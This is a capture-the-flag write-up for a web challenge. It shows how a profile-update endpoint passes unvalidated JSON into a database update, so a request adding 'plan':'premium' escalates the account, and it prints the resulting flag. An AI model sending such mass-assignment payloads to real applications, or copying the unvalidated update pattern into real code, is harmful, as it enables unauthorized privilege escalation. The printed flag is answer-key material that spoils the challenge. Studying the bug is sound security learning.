# Z

The intended barrier is `/api/flag`: it only returns the flag when `user.plan === "premium"`.

```ts
app.get("/api/flag", async (c) => {
  const user = await getUser(c);
  if (!user) return c.json({ error: "Unauthorized" }, 401);
  if (user.plan !== "premium") {
    return c.json({ error: "Premium required" }, 403);
  }

  return c.json({ flag: process.env.FLAG || "CPCTF{dummy}" });
});
```

Paying for premium is a dead end because `/api/upgrade` always fails.

```ts
app.post("/api/upgrade", async (c) => {
  const user = await getUser(c);
  if (!user) return c.json({ error: "Unauthorized" }, 401);

  return c.json(
    { error: "Payment failed. Please check your card details." },
    402,
  );
});
```

The real bug is mass assignment in the profile update endpoint:

```ts
type ProfileUpdate = {
  displayName: string;
  bio: string;
};

app.put("/api/me", async (c) => {
  const user = await getUser(c);
  if (!user) return c.json({ error: "Unauthorized" }, 401);

  const body: ProfileUpdate = await c.req.json();
  updateProfile(user.id, body);
  ...
});
```

`ProfileUpdate` is only a TypeScript type. At runtime, the server accepts any extra JSON fields and forwards them into:

```ts
function updateProfile(id: number, data: ProfileUpdate) {
  db.update(users).set(data).where(eq(users.id, id)).run();
}
```

So we can send `plan: "premium"` ourselves.

Exploit:

1. Register or log in.
2. Send:

```http
PUT /api/me
Content-Type: application/json

{"displayName":"x","bio":"y","plan":"premium"}
```

3. Call `/api/flag`.

On the live instance, this changed my account to premium and `/api/flag` returned:

```json
{"flag":"CPCTF{YOU_wRit3_TyP3ScRipt_aNd_eX3cuTE_JAV4scripT}"}
```

Flag:

```text
CPCTF{YOU_wRit3_TyP3ScRipt_aNd_eX3cuTE_JAV4scripT}
```
